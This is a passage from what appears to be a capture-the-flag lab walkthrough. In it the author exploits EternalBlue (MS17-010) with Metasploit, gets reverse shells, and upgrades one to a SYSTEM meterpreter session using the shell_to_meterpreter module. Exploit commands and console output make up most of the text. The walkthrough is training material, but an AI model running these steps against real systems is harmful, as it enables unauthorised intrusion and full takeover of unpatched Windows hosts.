</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">2</span> opened <span class="o">(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49173 <span class="o">)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">4</span> opened <span class="o">(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49175 <span class="o">)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49172 <span class="o">)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">3</span> opened <span class="o">(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49174 <span class="o">)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">5</span> opened <span class="o">(</span>10.8.33.96:4444 -&gt; 10.10.14.17:49176 <span class="o">)</span> at 2022-04-09 02:35:37 +0200
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">336</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-WIN-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> 10.10.14.17:445 - <span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Shell Banner:
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 6.1.7601<span class="o">]</span>
</span></span><span class="line"><span class="cl">-----
</span></span><span class="line"><span class="cl">          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>I successfully exploited Eternal Blue and got a reverse shell from the victim.</p>
<ul>
<li>Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.</li>
</ul>
<p>I backgrounded the shell session using <code>CTRL + Z</code></p>
<hr>
<h2 id="task-3-escalate">Task 3: Escalate</h2>
<h3 id="escalate-privileges-learn-how-to-upgrade-shells-in-metasploit">Escalate privileges, learn how to upgrade shells in metasploit.</h3>
<hr>
<ul>
<li>If you haven&rsquo;t already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)</li>
</ul>
<p>I backgrounded the shell using CTRL + Z</p>
<p>Let&rsquo;s search the correct post-exploitation module to convert this basic shell
to a meterpreter shell!</p>
<p><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; search -t post meterpreter</code></p>
<p>This one sounds good: <code>post/multi/manage/shell_to_meterpreter</code></p>
<ul>
<li>Select this (use MODULE_PATH). Show options, what option are we required to change?</li>
</ul>
<p><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use post/multi/manage/shell_to_meterpreter</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; show options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>post/multi/manage/shell_to_meterpreter<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name     Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----     ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   HANDLER  <span class="nb">true</span>             yes       Start an exploit/multi/handler to receive the connection
</span></span><span class="line"><span class="cl">   LHOST                     no        IP of host that will receive the connection from the payload <span class="o">(</span>Will try to auto d
</span></span><span class="line"><span class="cl">                                       etect<span class="o">)</span>.
</span></span><span class="line"><span class="cl">   LPORT    <span class="m">4433</span>             yes       Port <span class="k">for</span> payload to connect to.
</span></span><span class="line"><span class="cl">   SESSION                   yes       The session to run this module on
</span></span></code></pre></td></tr></table>
</div>
</div><p>The options we need to set is the <code>SESSION</code> option.</p>
<ul>
<li>Set the required option, you may need to list all of the sessions to find your target here.</li>
</ul>
<p>Let&rsquo;s find the correct session first.</p>
<p>I have a ton of sessions open&hellip; I will try the first one.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; sessions
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Active <span class="nv">sessions</span>
</span></span><span class="line"><span class="cl"><span class="o">===============</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Id   Name  Type               Information                                 Connection
</span></span><span class="line"><span class="cl">  --   ----  ----               -----------                                 ----------
</span></span><span class="line"><span class="cl">  <span class="m">1</span>          shell x64/windows  Shell Banner: Microsoft Windows <span class="o">[</span>Version <span class="m">6</span>  10.8.33.96:4444 -&gt; 10.10.14.17:49172  <span class="o">(</span>10.1
</span></span><span class="line"><span class="cl">                                .1.7601<span class="o">]</span> -----                              0.14.17<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; <span class="nb">set</span> SESSION <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="nv">SESSION</span> <span class="o">=</span>&gt; <span class="m">1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>Run! If this doesn&rsquo;t work, try completing the exploit from the previous task once more.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Upgrading session ID: <span class="m">1</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting exploit/multi/handler
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.8.33.96:4433 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Post module execution completed
</span></span></code></pre></td></tr></table>
</div>
</div><p>That did not work.</p>
<p>I will try it with the last one&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; <span class="nb">set</span> SESSION <span class="m">264</span>
</span></span><span class="line"><span class="cl"><span class="nv">SESSION</span> <span class="o">=</span>&gt; <span class="m">264</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Upgrading session ID: <span class="m">264</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting exploit/multi/handler
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.8.33.96:4433 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Post module execution completed
</span></span><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">200262</span> bytes<span class="o">)</span> to 10.10.14.17
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">265</span> opened <span class="o">(</span>10.8.33.96:4433 -&gt; 10.10.14.17:49701 <span class="o">)</span> at 2022-04-09 02:50:03 +0200
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stopping exploit/multi/handler
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ok so this looks way better!</p>
<ul>
<li>Once the meterpreter shell conversion completes, select that session for use.</li>
</ul>
<p>After looking at the sessions with the command <code>sessions</code>
I saw a new session</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">265</span>        meterpreter x64/windows  NT AUTHORITY<span class="se">\S</span>YSTEM @ JON-PC             10.8.33.96:4433 -&gt; 10.10.14.17:49701  <span class="o">(</span><span class="m">1</span>
</span></span><span class="line"><span class="cl">                                                                               0.10.14.17<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s try to interact with it!</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 post<span class="o">(</span>multi/manage/shell_to_meterpreter<span class="o">)</span> &gt; sessions -i <span class="m">265</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting interaction with 265...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>We finally got a meterpreter shell!</p>
<p>And it is working:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer        : JON-PC
